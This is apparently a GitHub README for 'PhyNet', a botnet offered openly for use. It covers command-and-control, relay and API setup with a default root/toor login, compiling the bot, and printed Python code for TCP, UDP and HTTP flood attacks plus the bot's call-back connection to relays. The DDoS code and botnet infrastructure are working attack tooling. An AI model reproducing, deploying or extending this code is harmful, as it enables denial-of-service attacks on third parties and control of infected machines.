# PhyNet
 phynet is a botnet coded in python and php, wich is using relays for balancing bots and uses only one cnc.  
 phynet is an old project in bad languages for a botnet and actually not working well, you may want to uses oldest versions, you can consider this code as a POC of a easy balanced botnet

# CNC
Def: "Command and Control" (C&C) servers are centralized machines that are able to send commands and receive outputs of machines part of a botnet. Anytime attackers who wish to launch a DDoS attack can send special commands to their botnet's C&C servers with instructions to perform an attack on a particular target, and any infected machines communicating with the contacted C&C server will comply by launching a coordinated attack.   

My cnc works with a relay (which will relay the commands to the bots to avoid an overload of the cnc server), it also works with an api which will be mainly used to register the relay servers to be able to dispatch the bots on the server having the least load, the api will also be used to login on the cnc

for setup the [cnc](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/cnc.py):  
```batch
python3 cnc.py <port>
```
or just `make cnc` with the makefile

The cnc password is stored in the sql database, the cnc uses the page [login.php](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2/login.php) for login, like this we doesn't have to keep a raw text file with the password in it, moreover the password is a combo of sha512(sha256(password)) and is inserted with the following sql command: 
```sql
INSERT INTO users (id, username, password) VALUES (1, 'root', 'a528e21133187fecdd0c8f5c583733cfe86e7b6e3857dcd5682f6f54fb17fcce8f9da13c8c90854741df8d096f3d415291a4f6b7f08028a47c6abc82a2ea760c');
```
here the default username is **root** and the default password is **toor**

# RELAY
for setup the [relay](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/relay.py):  
```batch
python3 relay.py <port>
```
or just `make relay` with the makefile

# API
for setup the [api](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v2), you need a database:
## API Database:
```sql
DROP TABLE IF EXISTS relays;
CREATE TABLE relays (
    relay_ip TEXT NOT NULL,
    relay_bots INTEGER NOT NULL,
    relay_swap_key TEXT NOT NULL
);

DROP TABLE IF EXISTS users;
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL
);

INSERT INTO users (id, username, password) VALUES (1, 'root', 'a528e21133187fecdd0c8f5c583733cfe86e7b6e3857dcd5682f6f54fb17fcce8f9da13c8c90854741df8d096f3d415291a4f6b7f08028a47c6abc82a2ea760c');
```
(the password encryption is sha512)   
In php you can use this function for generate a password
```php
function createAccount(string $usr, string $password): bool {
    global $conn; // ensure to have the db conn

    // the final password is sha512(sha256(password))
    $password = hash('sha256', $password);
    $password = hash('sha512', $password);

    // insert the new user in the database
    $stmt = $conn->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $usr, $password);
    $result = $stmt->execute();

    return $result;
}
```
Next, you will need to build and start the api server which in v3 is in golang so you doesn't need a php server anymore, just a simple `make api` will run it but before you will need to have golang installed [like This](https://go.dev/doc/install) and you will also need to have a postgresql server as main database (postgresql is an application which is running on a server, so you can buy dedicated postgresql servers on the cloud (AWS, OVH, etc) or you can run your own on your computer or your server [Like This](https://www.postgresql.org/download/) or [With Docker](https://www.docker.com/blog/how-to-use-the-postgres-docker-official-image/))  
To connect your database with your api, you can go on [postgres.go](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/api/v3/internal/databases/postgres.go#L13) and change lines 13, 14 and 15 with your config.
Once your api is running with your database connected you'll have to change your api url (only the ip) in:  
> the zomb ([CLIENT/zomb.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/bot/zomb.py#L44)) `API_URL: str = "http://127.0.0.1/v3"` (L44),  
> the cnc config ([SERVER/cnc.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/cnc/modules/config.py#L52)) `API_URL: ClassVar[str] = "http://127.0.0.1:8052/v3"` (L52),  
> and the relay config ([SERVER/relay.py](https://github.com/4lxprime/PhyNet/blob/main/PhyNet/server/relay/modules/config.py#L41)) `API_URL: ClassVar[str] = "http://127.0.0.1:8052/v3"` (L41)  

# ZOMB
you may want to compile the bot with nuitka (create a fast executable file because the python code is transpiled to c and compiled)
but the simple command for running it is:
```batch
python3 zomb.py
```
you can just build it (with nuitka) with the command `make build-bot` or run it with `make bot`

## ZOMB DDOS Code: 
here is a preview of the zomb ddos code for each mode, it's really basic but if you want to improve it, don't hesitate to contact me (my discord is in my profile)
```python
def dos(
    s: sock,
    attack: tuple[str, int],
    tps: int,
    method: str,
) -> None: # start dos attack with socket and attack target
    tps += int(time()) # set the attack time with actual time + attack time

    match method:
        case "TCP":
            log("TCP")
            while time() < tps:
                try:
                    s.connect(attack)
                    while time() < tps:
                        s.send(bytes(PAYLOAD, "utf-8"))
                except: pass

        case "UDP":
            log("UDP")
            while time() < tps:
                try:
                    s.sendto(bytes(PAYLOAD, "utf-8"), attack)
                except: pass

        case "HTTP":
            while time() < tps:
                try:
                    s.connect(attack)
                    while time() < tps:
                        s.send(f'GET / HTTP/1.1\r\nHost: {attack[0]}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())

                except: s.close()

        case _:
            log("Unknown")
            while time() < tps:
                try:
                    s.sendto(bytes(PAYLOAD, "utf-8"), attack)
                except: pass
```
## The ZOMB Socket Connection
```python
relay: sock = sock(AF_INET, SOCK_STREAM)
relay.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)

while 1:
    try:
        RELAY_IP: str = rget(f"{API_URL}/dispatch?urlkey={URL_KEY}", timeout=5000).text

        relay_address.clear()
        relay_address.append(RELAY_IP)

        relay.connect((RELAY_IP, RELAY_PORT))

        log((RELAY_IP, RELAY_PORT))

        while 1:
            data: str = relay.recv(1024).decode()

            if 'Username' in data:
                relay.send('BOT'.encode())
                log("send bot")
                break

        while 1:
            data: str = relay.recv(1024).decode()

            if 'Password' in data:
                relay.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                log("send bot string")
                break

        break

    except:
        sleep(240)
```
